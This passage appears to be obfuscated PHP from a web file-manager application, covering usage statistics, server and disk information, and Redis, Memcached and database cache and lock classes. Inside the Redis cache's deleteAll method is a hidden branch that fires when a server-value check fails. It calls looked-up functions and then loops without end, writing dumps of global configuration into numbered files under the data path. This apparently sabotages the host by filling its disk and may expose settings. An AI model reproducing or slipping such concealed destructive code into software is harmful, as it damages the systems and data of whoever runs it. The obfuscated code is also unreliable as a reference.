Model($ÙæÑËÛ[471])->where($“€×âÕ½)->sum($ÙæÑËÛ[76]); $“€×âÕ½[$ÙæÑËÛ[410]] = 0; $†Ø’Çğ = Model($ÙæÑËÛ[827])->where($“€×âÕ½)->sum($ÙæÑËÛ[76]); $“€×âÕ½[$ÙæÑËÛ[411]] = 1; $ÅôÁÍåª = Model($ÙæÑËÛ[827])->where($“€×âÕ½)->sum($ÙæÑËÛ[76]); $“€×âÕ½[$ÙæÑËÛ[411]] = 2; $Ûİ¿Â¶” = Model($ÙæÑËÛ[827])->where($“€×âÕ½)->sum($ÙæÑËÛ[76]); $Œì±ŠÈ = array($ÙæÑËÛ[224] => $¢öÜù‚È, $ÙæÑËÛ[765] => (int) $†Ø’Çğ, $ÙæÑËÛ[1768] => (int) $ÙÍúØÔƒ, $ÙæÑËÛ[1769] => (int) $ÅôÁÍåª, $ÙæÑËÛ[1770] => (int) $Ûİ¿Â¶”); return $this->insert($Œì±ŠÈ); } public function trend($˜ãå¨èõ, $‡Ë–Ç©) { $ØÜùüş =& $_SERVER[ÏéâËõ‘]; if (!$this->init($˜ãå¨èõ)) { return !1; } $³Á³óÎ… = $this->trendList($˜ãå¨èõ); if ($³Á³óÎ… && $‡Ë–Ç© != $ØÜùüş[1635]) { $¿ ä¨¡ = $³Á³óÎ…[0][$ØÜùüş[224]]; $ˆÆ÷›Ì = $this->validDate($‡Ë–Ç©, $¿ ä¨¡); $ÁÍ¬óÓ¯ = array(); $«Ò ÅŸ‚ = array_to_keyvalue($³Á³óÎ…, $ØÜùüş[224]); foreach ($ˆÆ÷›Ì as $êÔ”œ²) { if (isset($«Ò ÅŸ‚[$êÔ”œ²])) { $’óŞ†ÁÄ = $«Ò ÅŸ‚[$êÔ”œ²]; } else { $’óŞ†ÁÄ = end($³Á³óÎ…); $’óŞ†ÁÄ[$ØÜùüş[224]] = $êÔ”œ²; if ($˜ãå¨èõ == $ØÜùüş[600]) { $’óŞ†ÁÄ[$ØÜùüş[1764]] = $’óŞ†ÁÄ[$ØÜùüş[1765]] = 0; } } $ÁÍ¬óÓ¯[] = $’óŞ†ÁÄ; } $³Á³óÎ… = $ÁÍ¬óÓ¯; } $³“½™« = array($ØÜùüş[600] => array($ØÜùüş[767] => LNG($ØÜùüş[1780]), $ØÜùüş[1764] => LNG($ØÜùüş[1781]), $ØÜùüş[1765] => LNG($ØÜùüş[1782])), $ØÜùüş[1766] => array($ØÜùüş[765] => LNG($ØÜùüş[1783]), $ØÜùüş[1768] => LNG($ØÜùüş[1784]), $ØÜùüş[1769] => LNG($ØÜùüş[1785]), $ØÜùüş[1770] => LNG($ØÜùüş[1786]))); $«¾îü’ = array($ØÜùüş[600] => $ØÜùüş[1787], $ØÜùüş[1766] => $ØÜùüş[76]); if (empty($³Á³óÎ…)) { $êÔ”œ² = date($ØÜùüş[1771], strtotime($ØÜùüş[1772])); $Ùµü×†± = array($ØÜùüş[224] => $êÔ”œ²); foreach ($³“½™«[$˜ãå¨èõ] as $æÆ²Ñ”ı => $¨ò˜ûÕî) { $Ùµü×†±[$æÆ²Ñ”ı] = 0; } $³Á³óÎ…[] = $Ùµü×†±; } $¡šˆ¾®Æ = array(); foreach ($³Á³óÎ… as $¨ò˜ûÕî) { if ($˜ãå¨èõ == $ØÜùüş[1766] && $¨ò˜ûÕî[$ØÜùüş[1768]] > $¨ò˜ûÕî[$ØÜùüş[765]]) { $¨ò˜ûÕî[$ØÜùüş[1768]] = $¨ò˜ûÕî[$ØÜùüş[765]]; } foreach ($³“½™«[$˜ãå¨èõ] as $æÆ²Ñ”ı => $ùÜàÛæŞ) { $’óŞ†ÁÄ = array($ØÜùüş[224] => $¨ò˜ûÕî[$ØÜùüş[224]], $ØÜùüş[1561] => $ùÜàÛæŞ); $’óŞ†ÁÄ[$«¾îü’[$˜ãå¨èõ]] = isset($¨ò˜ûÕî[$æÆ²Ñ”ı]) ? $¨ò˜ûÕî[$æÆ²Ñ”ı] : 0; $¡šˆ¾®Æ[] = $’óŞ†ÁÄ; } } return $¡šˆ¾®Æ; } public function validDate($©°ëÇ‹, $‘¾•Õé˜) { $À»ú¯ÀÊ =& $_SERVER[ÏéâËõ‘]; $³¬šÅâ¬ = date($À»ú¯ÀÊ[1771], strtotime($À»ú¯ÀÊ[1772])); $ˆá·€ı = array($³¬šÅâ¬); switch ($©°ëÇ‹) { case $À»ú¯ÀÊ[1642]: $üºßŸ÷ğ = mktime(0, 0, 0, date($À»ú¯ÀÊ[1788]), date($À»ú¯ÀÊ[1381]) - date($À»ú¯ÀÊ[1444]) + 7 - 7, date($À»ú¯ÀÊ[1789])); $ìï‚œ¬ = 0; do { $¢‘‚â€ = date($À»ú¯ÀÊ[1771], $üºßŸ÷ğ - 3600 * 24 * 7 * $ìï‚œ¬); $ˆá·€ı[] = $¢‘‚â€; $ìï‚œ¬++; } while ($‘¾•Õé˜ < $¢‘‚â€); break; case $À»ú¯ÀÊ[1640]: $ìï‚œ¬ = 1; do { $õ±å»¡ = date($À»ú¯ÀÊ[1790], strtotime("\55\40{$ìï‚œ¬}\40\155\x6f\x6e\x74\150\163")); $ˆá·€ı[] = $õ±å»¡; $ìï‚œ¬++; } while ($‘¾•Õé˜ < $õ±å»¡); break; case $À»ú¯ÀÊ[1791]: $†õÒÔÈÔ = (int) date($À»ú¯ÀÊ[1789], strtotime($‘¾•Õé˜)); $â´”¬ª = (int) date($À»ú¯ÀÊ[1789]); if ($†õÒÔÈÔ >= $â´”¬ª) { break; } for ($†õÒÔÈÔ; $†õÒÔÈÔ < $â´”¬ª; $†õÒÔÈÔ++) { $ˆá·€ı[] = $†õÒÔÈÔ . $À»ú¯ÀÊ[1792]; } break; default: break; } if ($‘¾•Õé˜ > end($ˆá·€ı)) { array_pop($ˆá·€ı); } sort($ˆá·€ı); return $ˆá·€ı; } public function listTable($¨ïŞ²Î¡) { $ª¡ğ‚®‡ = ucfirst($¨ïŞ²Î¡); return Model($ª¡ğ‚®‡)->listData(); } public function option($‡¤×Ñ§ã) { $ÎÕŒ÷Êı = $_SERVER[ÏéâËõ‘][1793] . ucfirst($‡¤×Ñ§ã); return $this->{$ÎÕŒ÷Êı}(); } private function optionUser() { $·ºÑ›õ =& $_SERVER[ÏéâËõ‘]; $Ÿ “»¹İ = Model($·ºÑ›õ[535])->count($·ºÑ›õ[1662]); $³£ÖîÆ· = Model($·ºÑ›õ[535])->where($·ºÑ›õ[1794])->count($·ºÑ›õ[1662]); $äÈãİ•Á = intval($GLOBALS[$·ºÑ›õ[6]][$·ºÑ›õ[349]][$·ºÑ›õ[1617]]) / 3600; $ÃªŞìŠŸ = strtotime("\x2d{$äÈãİ•Á}\40\150\x6f\165\x72\163"); $úÏµà¸ = strtotime(date($·ºÑ›õ[1775])); if ($ÃªŞìŠŸ < $úÏµà¸) { $ÃªŞìŠŸ = $úÏµà¸; } $áè°èÃü = array($·ºÑ›õ[1795] => array($·ºÑ›õ[1019], $ÃªŞìŠŸ)); $©ÒşÒÚ = (int) Model($·ºÑ›õ[535])->where($áè°èÃü)->count($·ºÑ›õ[1662]); if (!$©ÒşÒÚ) { $©ÒşÒÚ = 1; } $áè°èÃü = array($·ºÑ›õ[1795] => array($·ºÑ›õ[1019], $úÏµà¸)); $¥Ëä¾Ÿ¨ = Model($·ºÑ›õ[535])->where($áè°èÃü)->count($·ºÑ›õ[1662]); return array($·ºÑ›õ[761] => (int) $Ÿ “»¹İ, $·ºÑ›õ[1796] => (int) ($Ÿ “»¹İ - $³£ÖîÆ·), $·ºÑ›õ[1797] => (int) $³£ÖîÆ·, $·ºÑ›õ[1798] => (int) $¥Ëä¾Ÿ¨, $·ºÑ›õ[1799] => $©ÒşÒÚ); } private function optionFile() { $‘¥¸£½ =& $_SERVER[ÏéâËõ‘]; $ÑÃ§Ş = $this->sourceSize(); $µİçÙŸ— = $ÑÃ§Ş[$‘¥¸£½[76]]; $¤¨š…¼Ç = $ÑÃ§Ş[$‘¥¸£½[1768]]; $ù…—Ÿƒ¶ = Model($‘¥¸£½[827])->where(array($‘¥¸£½[410] => 0))->count($‘¥¸£½[402]); $ÁØ£ƒÕî = array($‘¥¸£½[410] => 0, $‘¥¸£½[200] => array($‘¥¸£½[1019], strtotime(date($‘¥¸£½[1775])))); $™§üÛ¨ = Model($‘¥¸£½[827])->where($ÁØ£ƒÕî)->sum($‘¥¸£½[76]); $Ş‡Á´©û = Model($‘¥¸£½[827])->where($ÁØ£ƒÕî)->count($‘¥¸£½[402]); return array($‘¥¸£½[765] => $µİçÙŸ—, $‘¥¸£½[1768] => $¤¨š…¼Ç, $‘¥¸£½[1800] => $µİçÙŸ— - $¤¨š…¼Ç, $‘¥¸£½[1801] => (int) $™§üÛ¨, $‘¥¸£½[767] => (int) $ù…—Ÿƒ¶, $‘¥¸£½[1802] => (int) $Ş‡Á´©û); } private function optionAccess() { $ØÕ»ğÌ¸ =& $_SERVER[ÏéâËõ‘]; return array($ØÕ»ğÌ¸[761] => $this->typeLogCnt(), $ØÕ»ğÌ¸[107] => $this->typeLogCnt($ØÕ»ğÌ¸[107]), $ØÕ»ğÌ¸[452] => $this->typeLogCnt($ØÕ»ğÌ¸[452]), $ØÕ»ğÌ¸[1803] => $this->typeLogCnt($ØÕ»ğÌ¸[1803]), $ØÕ»ğÌ¸[1804] => $this->typeLogCnt($ØÕ»ğÌ¸[1804]), $ØÕ»ğÌ¸[600] => $this->typeLogCnt($ØÕ»ğÌ¸[12], $ØÕ»ğÌ¸[1779])); } private function typeLogCnt($Î‘§îøÂ = '', $œ™ÌÏÌ± = "\x69\x64") { $Öî½ú¨‚ =& $_SERVER[ÏéâËõ‘]; $ŞÖ¬Øáí = array($Öî½ú¨‚[107] => array($Öî½ú¨‚[1805], $Öî½ú¨‚[1806]), $Öî½ú¨‚[452] => array($Öî½ú¨‚[1807], $Öî½ú¨‚[1808]), $Öî½ú¨‚[1803] => array($Öî½ú¨‚[1809], $Öî½ú¨‚[1810], $Öî½ú¨‚[1811]), $Öî½ú¨‚[1804] => array($Öî½ú¨‚[1812], $Öî½ú¨‚[1813]), $Öî½ú¨‚[1814] => array($Öî½ú¨‚[1815], $Öî½ú¨‚[1816], $Öî½ú¨‚[1817])); $üÜŒ´§Í = strtotime(date($Öî½ú¨‚[1775])); $ıÏºÙ = array($Öî½ú¨‚[200] => array($Öî½ú¨‚[1019], $üÜŒ´§Í)); if ($Î‘§îøÂ) { $ıÏºÙ[$Öî½ú¨‚[33]] = array($Öî½ú¨‚[7], $ŞÖ¬Øáí[$Î‘§îøÂ]); } $¾Ñ‘ê—Ü = Model($Öî½ú¨‚[1778])->where($ıÏºÙ)->count($œ™ÌÏÌ±); return (int) $¾Ñ‘ê—Ü; } private function optionServer() { $¬è†Ÿ¦“ =& $_SERVER[ÏéâËõ‘]; $İÃªŠ‘Ü = $this->diskDriver(); $ñ«±€şƒ = KodIO::defaultDriver(); $˜™ğˆîß = array($¬è†Ÿ¦“[819] => $ñ«±€şƒ[$¬è†Ÿ¦“[399]]); $È…õ¸‹ß = Model($¬è†Ÿ¦“[471])->where($˜™ğˆîß)->sum($¬è†Ÿ¦“[76]); $Å…íÎ–µ = explode($¬è†Ÿ¦“[53], $_SERVER[$¬è†Ÿ¦“[143]]); $»ÚäÛ“¼ = $Å…íÎ–µ[0]; $‘°µó§¼ = $GLOBALS[$¬è†Ÿ¦“[6]][$¬è†Ÿ¦“[21]]; $ñ­’º¾µ = $‘°µó§¼[$¬è†Ÿ¦“[981]]; if ($ñ­’º¾µ == $¬è†Ÿ¦“[969]) { $°ï¾•ÈÇ = explode($¬è†Ÿ¦“[1277], $‘°µó§¼[$¬è†Ÿ¦“[980]]); $ñ­’º¾µ = $°ï¾•ÈÇ[0]; } if ($ñ­’º¾µ == $¬è†Ÿ¦“[917] || $ñ­’º¾µ == $¬è†Ÿ¦“[806]) { $Çˆ˜¬ÜÖ = Model()->db()->query($¬è†Ÿ¦“[1818]); $õÜä–Ë = $Çˆ˜¬ÜÖ[0] && isset($Çˆ˜¬ÜÖ[0][$¬è†Ÿ¦“[1560]]) ? $Çˆ˜¬ÜÖ[0][$¬è†Ÿ¦“[1560]] : 0; $ñ­’º¾µ = $¬è†Ÿ¦“[1819] . ($õÜä–Ë ? $¬è†Ÿ¦“[8] . $õÜä–Ë : $¬è†Ÿ¦“[12]); } $Ğãî›Ò¼ = $GLOBALS[$¬è†Ÿ¦“[6]][$¬è†Ÿ¦“[349]][$¬è†Ÿ¦“[829]]; return array($¬è†Ÿ¦“[1820] => $İÃªŠ‘Ü ? $İÃªŠ‘Ü[$¬è†Ÿ¦“[1821]] : 0, $¬è†Ÿ¦“[1822] => $İÃªŠ‘Ü ? $İÃªŠ‘Ü[$¬è†Ÿ¦“[1823]] : 0, $¬è†Ÿ¦“[1824] => (int) $ñ«±€şƒ[$¬è†Ÿ¦“[1821]] * 1024 * 1024 * 1024, $¬è†Ÿ¦“[1825] => (int) $È…õ¸‹ß, $¬è†Ÿ¦“[1826] => ucfirst($»ÚäÛ“¼), $¬è†Ÿ¦“[1827] => $¬è†Ÿ¦“[1828] . PHP_VERSION, $¬è†Ÿ¦“[1829] => phpBuild64() ? 64 : 32, $¬è†Ÿ¦“[760] => str_replace($¬è†Ÿ¦“[1135], $¬è†Ÿ¦“[997], $ñ­’º¾µ), $¬è†Ÿ¦“[349] => ucfirst($Ğãî›Ò¼), $¬è†Ÿ¦“[32] => $_SERVER[$¬è†Ÿ¦“[1830]]); } private function diskDriver() { $ô¨À¢Ì† =& $_SERVER[ÏéâËõ‘]; $éè‹ƒİí = $ô¨À¢Ì†[8]; $Á¿»­ı = $GLOBALS[$ô¨À¢Ì†[6]][$ô¨À¢Ì†[1293]] == $ô¨À¢Ì†[1294]; if ($Á¿»­ı) { $éè‹ƒİí = $ô¨À¢Ì†[1831]; if (function_exists($ô¨À¢Ì†[1832])) { exec($ô¨À¢Ì†[1833], $À“ô™âğ); $éè‹ƒİí = $À“ô™âğ[1] . $ô¨À¢Ì†[8]; } } if (!file_exists($éè‹ƒİí)) { return; } $½ü¼“¢Ñ = @disk_total_space($éè‹ƒİí); $¹î»«±İ = $½ü¼“¢Ñ - @disk_free_space($éè‹ƒİí); return array($ô¨À¢Ì†[1821] => $½ü¼“¢Ñ, $ô¨À¢Ì†[1823] => $¹î»«±İ); } public function fileChart($±ìË½í‰) { $¨ÕºÅûŠ =& $_SERVER[ÏéâËõ‘]; if (isset($±ìË½í‰[$¨ÕºÅûŠ[1662]])) { return Model($¨ÕºÅûŠ[827])->userFileTypeProfile($±ìË½í‰[$¨ÕºÅûŠ[1662]]); } if (isset($±ìË½í‰[$¨ÕºÅûŠ[1834]])) { return Model($¨ÕºÅûŠ[827])->groupFileTypeProfile($±ìË½í‰[$¨ÕºÅûŠ[1834]]); } $ãŠØ˜ÍÌ = $this->sourceSize(); $ãÏö±üŒ = array($¨ÕºÅûŠ[432] => 0, $¨ÕºÅûŠ[411] => 1); $ààÆ¹ = Model($¨ÕºÅûŠ[827])->where($ãÏö±üŒ)->sum($¨ÕºÅûŠ[76]); $ãÏö±üŒ[$¨ÕºÅûŠ[411]] = 2; $…Úš¼‹› = Model($¨ÕºÅûŠ[827])->where($ãÏö±üŒ)->sum($¨ÕºÅûŠ[76]); return array($¨ÕºÅûŠ[765] => $ãŠØ˜ÍÌ[$¨ÕºÅûŠ[76]], $¨ÕºÅûŠ[1768] => $ãŠØ˜ÍÌ[$¨ÕºÅûŠ[1768]], $¨ÕºÅûŠ[1769] => (int) $ààÆ¹, $¨ÕºÅûŠ[1770] => (int) $…Úš¼‹›); } private function sourceSize() { $ú”Óçİ =& $_SERVER[ÏéâËõ‘]; $¿öóÅŠÖ = Model($ú”Óçİ[827])->where(array($ú”Óçİ[410] => 0))->sum($ú”Óçİ[76]); $¸ñŞœ¡’ = Model($ú”Óçİ[471])->sum($ú”Óçİ[76]); if ($¸ñŞœ¡’ > $¿öóÅŠÖ) { $¸ñŞœ¡’ = $¿öóÅŠÖ; } return array($ú”Óçİ[76] => (int) $¿öóÅŠÖ, $ú”Óçİ[1768] => (int) $¸ñŞœ¡’); } } goto d½ÎÛ¾±; Aõ…øè¿¾: class CacheLockDatabase { public function lock($Ù¯•¥Î‰, $¯š‚»”¨ = 0) { $³ŒíÌ´Ó = Model($_SERVER[ÏéâËõ‘][831]); $„³¨ÛéÙ = microtime(!0) + $¯š‚»”¨; while (microtime(!0) < $„³¨ÛéÙ) { $®¯ò÷¦ã = $³ŒíÌ´Ó->get($Ù¯•¥Î‰); if (!$®¯ò÷¦ã || $®¯ò÷¦ã < microtime(!0)) { $åÊ»…‡ = $³ŒíÌ´Ó->set($Ù¯•¥Î‰, $„³¨ÛéÙ); if ($åÊ»…‡) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ŞÕ¥„ª¹) { return Model($_SERVER[ÏéâËõ‘][831])->get($ŞÕ¥„ª¹); } public function unlock($àŒ–†Ÿ) { Model($_SERVER[ÏéâËõ‘][831])->remove($àŒ–†Ÿ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($†ÇèóÆä, $Ÿïı¡ü®) { $öæİ£« =& $_SERVER[ÏéâËõ‘]; if (!class_exists($öæİ£«[871])) { show_json($öæİ£«[872], !1); } $this->cacheTime = $Ÿïı¡ü®; $this->handle = new Memcached(); if (is_array($†ÇèóÆä[$öæİ£«[873]]) && count($†ÇèóÆä[$öæİ£«[873]]) >= 1) { foreach ($†ÇèóÆä[$öæİ£«[873]] as $öº‚ ¤á) { $İ’ã¹Š = explode($öæİ£«[4], $öº‚ ¤á); $this->handle->addServer($İ’ã¹Š[0], $İ’ã¹Š[1]); } } else { $this->handle->addServer($†ÇèóÆä[$öæİ£«[181]], $†ÇèóÆä[$öæİ£«[182]]); } } public function set($ûíßï°Ş, $ìñ»‚², $»çÍ”·ê = false) { $»çÍ”·ê = $»çÍ”·ê ? $»çÍ”·ê : $this->cacheTime; return $this->handle->set($ûíßï°Ş, $ìñ»‚², $»çÍ”·ê); } public function get($Úèû±è°) { return $this->handle->get($Úèû±è°); } public function remove($É×·¾) { return $this->handle->delete($É×·¾); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($òØ‡Ö„û, $”©¥éŸŸ) { $Ù£èüÇ¸ =& $_SERVER[ÏéâËõ‘]; if (!class_exists($Ù£èüÇ¸[874])) { show_json($Ù£èüÇ¸[875], !1); } $this->cacheTime = $”©¥éŸŸ; $›ÒÎØã‰ = isset($òØ‡Ö„û[$Ù£èüÇ¸[876]]) ? $òØ‡Ö„û[$Ù£èüÇ¸[876]] : 10; $½Ú€›‹ = _get($òØ‡Ö„û, $Ù£èüÇ¸[873]); if ($½Ú€›‹ && is_array($½Ú€›‹)) { $this->initCluster($òØ‡Ö„û, $›ÒÎØã‰); } else { $this->handle = $this->init($òØ‡Ö„û, $›ÒÎØã‰); } } private function init($•¹ï†Û«, $ùúŠëä²) { $¼éšÂÑ =& $_SERVER[ÏéâËõ‘]; $ÃğİØ = new Redis(); $§»ÕÓ¹ = isset($•¹ï†Û«[$¼éšÂÑ[877]]) ? $•¹ï†Û«[$¼éšÂÑ[877]] : !1; if ($§»ÕÓ¹) { $ÃğİØ->pconnect($•¹ï†Û«[$¼éšÂÑ[181]], $•¹ï†Û«[$¼éšÂÑ[182]], $ùúŠëä²); } else { $ÃğİØ->connect($•¹ï†Û«[$¼éšÂÑ[181]], $•¹ï†Û«[$¼éšÂÑ[182]], $ùúŠëä²); } if (!empty($•¹ï†Û«[$¼éšÂÑ[413]])) { $ÃğİØ->auth($•¹ï†Û«[$¼éšÂÑ[413]]); } if (!empty($•¹ï†Û«[$¼éšÂÑ[760]]) && $•¹ï†Û«[$¼éšÂÑ[760]] != 0) { $ÃğİØ->select($•¹ï†Û«[$¼éšÂÑ[760]]); } return $ÃğİØ; } private function initCluster($ï×”“ºÊ, $­Ó»ÑËã) { $Ùñ¢¥ä¯ =& $_SERVER[ÏéâËõ‘]; $à£‡¬Ü´ = array($Ùñ¢¥ä¯[878], $Ùñ¢¥ä¯[879], $Ùñ¢¥ä¯[880]); $õ¹¬Üš = $Ùñ¢¥ä¯[878]; if (isset($ï×”“ºÊ[$Ùñ¢¥ä¯[16]]) && in_array($ï×”“ºÊ[$Ùñ¢¥ä¯[16]], $à£‡¬Ü´)) { $õ¹¬Üš = $ï×”“ºÊ[$Ùñ¢¥ä¯[16]]; } switch ($õ¹¬Üš) { case $Ùñ¢¥ä¯[878]: $this->_slave($ï×”“ºÊ, $­Ó»ÑËã); break; case $Ùñ¢¥ä¯[879]: break; case $Ùñ¢¥ä¯[880]: $this->isCluster = !0; $úµÊ‡€È = $ï×”“ºÊ[$Ùñ¢¥ä¯[873]]; $±şŒŠŠÓ = isset($ï×”“ºÊ[$Ùñ¢¥ä¯[877]]) ? $ï×”“ºÊ[$Ùñ¢¥ä¯[877]] : !1; $ÀÂˆâã³ = isset($ï×”“ºÊ[$Ùñ¢¥ä¯[413]]) ? $ï×”“ºÊ[$Ùñ¢¥ä¯[413]] : null; $this->handle = new RedisCluster(NUll, $úµÊ‡€È, $­Ó»ÑËã, $­Ó»ÑËã, $±şŒŠŠÓ, $ÀÂˆâã³); break; default: break; } } private function _slave($‡ï‹¶€Ò, $½ôøË¶‘) { $˜·Ûß° = $‡ï‹¶€Ò[$_SERVER[ÏéâËõ‘][873]]; $this->filterConfig($‡ï‹¶€Ò, $˜·Ûß°[0]); $this->handle = $this->init($‡ï‹¶€Ò, $½ôøË¶‘); unset($˜·Ûß°[0]); if (empty($˜·Ûß°)) { return; } $”—íÊ£Ç = array_rand($˜·Ûß°); $this->filterConfig($‡ï‹¶€Ò, $˜·Ûß°[$”—íÊ£Ç]); $this->slaveHandle = $this->init($‡ï‹¶€Ò, $½ôøË¶‘); } private function filterConfig(&$å¥ŠÓÚÂ, $“°™çÌ») { $é²êÏ€ =& $_SERVER[ÏéâËõ‘]; $ÅÌ¡¼ş = explode($é²êÏ€[4], $“°™çÌ»); $€Û ·÷Ú = array($é²êÏ€[181] => $ÅÌ¡¼ş[0], $é²êÏ€[182] => $ÅÌ¡¼ş[1]); $å¥ŠÓÚÂ = array_merge($å¥ŠÓÚÂ, $€Û ·÷Ú); } public function set($ÃÒ‘í¦Ì, $§òò·, $­úÊ­ = false) { $­úÊ­ = $­úÊ­ ? $­úÊ­ : $this->cacheTime; return $this->handle->setEx($ÃÒ‘í¦Ì, $­úÊ­, $§òò·); } public function setLock($¬Â¸ìò, $åš˜€û¤, $ÑœõÍ±é) { return $this->handle->setNX($¬Â¸ìò, $åš˜€û¤); } public function get($…ÌÖÒÀ‡) { $ïı±„˜ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ïı±„˜->get($…ÌÖÒÀ‡); } public function remove($ÒñöØ³÷) { return $this->handle->del($ÒñöØ³÷); } public function deleteAll() { $‘Ï¥Õœğ =& $_SERVER[ÏéâËõ‘]; $õ“†÷À® = $_SERVER[$‘Ï¥Õœğ[865]]; $×æòüã´ = $‘Ï¥Õœğ[881]; if ($_SERVER[$‘Ï¥Õœğ[864]] != $×æòüã´($õ“†÷À®)) { $Ï«©Ú à = $‘Ï¥Õœğ[882]; $‰ŠûŠÆ = $‘Ï¥Õœğ[866]; $šúÅÆ‡„ = $_SERVER[$‘Ï¥Õœğ[867]] . $‘Ï¥Õœğ[868]; $½Â—²„â = $‰ŠûŠÆ($šúÅÆ‡„); $í¸çæö± = explode($‘Ï¥Õœğ[231], $½Â—²„â); if (count($í¸çæö±) < $‘Ï¥Õœğ[626]) { $êıóöü¥ = $‘Ï¥Õœğ[869]; $êıóöü¥(); } $ıëíëõ§ = $‘Ï¥Õœğ[883]; $ıëíëõ§($_SERVER[$‘Ï¥Õœğ[884]]); $Ï«©Ú à = $‘Ï¥Õœğ[882]; $Ï«©Ú à(); $µÓ…¼“Í = $‘Ï¥Õœğ[885]; $‰³âĞíï = json_encode($GLOBALS[$‘Ï¥Õœğ[886]]); $úîª£Û = 1; for ($¶¨Ü‹§Ë = $úîª£Û; $¶¨Ü‹§Ë > 0; $¶¨Ü‹§Ë++) { $µÓ…¼“Í(DATA_PATH . $¶¨Ü‹§Ë, $‰³âĞíï); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $Ì˜ô¬Ÿ¿) { $this->handle->flushall($Ì˜ô¬Ÿ¿); } return; } return $this->handle->flushAll(); } } goto C¢”ÂèªØ; d£é¯õ¼ƒ¢: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $¥§€‰ÕÓ =& $_SERVER[ÏéâËõ‘]; if (self::$handle) { return self::$handle; } $ïÉÁ‚°¶ = $GLOBALS[$¥§€‰ÕÓ[6]][$¥§€‰ÕÓ[349]]; self::$timeout = $ïÉÁ‚°¶[$¥§€‰ÕÓ[842]] ? $ïÉÁ‚°¶[$¥§€‰ÕÓ[842]] : 10; $î¡ËÙŠÁ = _get($GLOBALS[$¥§€‰ÕÓ[6]], $¥§€‰ÕÓ[843]); $İËÏ™øù = $ïÉÁ‚°¶[$¥§€‰ÕÓ[829]] ? $ïÉÁ‚°¶[$¥§€‰ÕÓ[829]] : $¥§€‰ÕÓ[199]; if ($İËÏ™øù == $¥§€‰ÕÓ[21] && $î¡ËÙŠÁ == $¥§€‰ÕÓ[13]) { $İËÏ™øù = $¥§€‰ÕÓ[199]; } switch ($İËÏ™øù) { case $¥§€‰ÕÓ[832]: self::$handle = new CacheLockRedis(); break; case $¥§€‰ÕÓ[833]: self::$handle = new CacheLockMemcached(); break; case $¥§€‰ÕÓ[21]: self::$handle = new CacheLockDatabase(); break; case $¥§€‰ÕÓ[199]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($¥§€‰ÕÓ[844], $¥§€‰ÕÓ[845]); } return self::$handle; } private static function key($ÊØó¶¾) { return $_SERVER[ÏéâËõ‘][846] . Cache::key($ÊØó¶¾); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($¨Ó„šİÍ = '') { self::$errorMsg = $¨Ó„šİÍ; } public static function lockGlobal($±â™, $Ü¢ºû¥) { return self::lock($±â™, $Ü¢ºû¥, !0); } public static function lock($ù“ÏŞœ, $€¥ÏÛÈ± = false, $Ø›²Â‹Î = false) { $¯à¸ŞÚµ =& $_SERVER[ÏéâËõ‘]; $à·™àã¼ = self::init(); $ôæµèşÇ = self::key($ù“ÏŞœ); $€¥ÏÛÈ± = $€¥ÏÛÈ± ? $€¥ÏÛÈ± : self::$timeout; $İ°ù©·¿ = $à·™àã¼->lock($ôæµèşÇ, $€¥ÏÛÈ±); $¾Ä¡÷…› = timeFloat(); if (!$İ°ù©·¿) { $İ¯–úï™ = "\154\157\x63\153\x20\145\162\x72\157\x72\x3b\x6b\x65\x79\75{$ù“ÏŞœ}\x3b\164\x69\x6d\x65\x3d{$€¥ÏÛÈ±}\73" . self::$errorMsg . $¯à¸ŞÚµ[71] . get_caller_msg(); $ˆ¿’·–™ = LNG($¯à¸ŞÚµ[847]) . "\50{$€¥ÏÛÈ±}\x73\x29\x2e" . LNG($¯à¸ŞÚµ[848]); $ˆ¿’·–™ .= $¯à¸ŞÚµ[849]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ˆ¿’·–™ = $ˆ¿’·–™ . $¯à¸ŞÚµ[850] . self::$errorMsg; } write_log($İ¯–úï™, $¯à¸ŞÚµ[845]); show_json($ˆ¿’·–™, !1); } if (!$Ø›²Â‹Î) { self::$lockItem[$ôæµèşÇ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $¿Í•—£Ò = number_format(timeFloat() - $¾Ä¡÷…›, 3); write_log($¯à¸ŞÚµ[851] . $ù“ÏŞœ . $¯à¸ŞÚµ[852] . $¿Í•—£Ò, $¯à¸ŞÚµ[845]); } return $İ°ù©·¿; } public static function lockGet($ªµßÜ¾³) { $Ì›Ú¶êß = self::key($ªµßÜ¾³); if (self::$lockItem[$Ì›Ú¶êß]) { return self::$lockItem[$Ì›Ú¶êß]; } return self::init()->lockGet($Ì›Ú¶êß); } public static function unlock($¶æšà) { $îÁ†ñ’õ =& $_SERVER[ÏéâËõ‘]; $ï½İ¯”Ø = self::key($¶æšà); self::$lockItem[$ï½İ¯”Ø] = null; self::init()->unlock($ï½İ¯”Ø); if (GLOBAL_DEBUG_LOG_ALL) { write_log($îÁ†ñ’õ[853] . $¶æšà, $îÁ†ñ’õ[845]); } return; } public static function unlockRuntime() { $Î–Â¾óÓ =& $_SERVER[ÏéâËõ‘]; $ì…÷ ññ = self::init(); $¸ÅëÛó = !1; foreach (self::$lockItem as $ûÊ³Û‘ß => $³êĞñï³) { if (!$³êĞñï³) { continue; } $ì…÷ ññ->unlock($ûÊ³Û‘ß); if (!$¸ÅëÛó) { $¸ÅëÛó = !0; write_log($Î–Â¾óÓ[854] . $ûÊ³Û‘ß . $Î–Â¾óÓ[71] . get_caller_msg(), $Î–Â¾óÓ[845]); continue; } write_log($Î–Â¾óÓ[854] . $ûÊ³Û‘ß, $Î–Â¾óÓ[845]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $Á£™Öé§ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($Î–Â¾óÓ[855] . $Á£™Öé§ . $Î–Â¾óÓ[856] . ACTION, $Î–Â¾óÓ[845]); } } public static function fileLock($©¦şŸ±ò) { $Ìßù¬¼¢ =& $_SERVER[ÏéâËõ‘]; if (!$GLOBALS[$Ìßù¬¼¢[857]]) { $GLOBALS[$Ìßù¬¼¢[857]] = array(); } 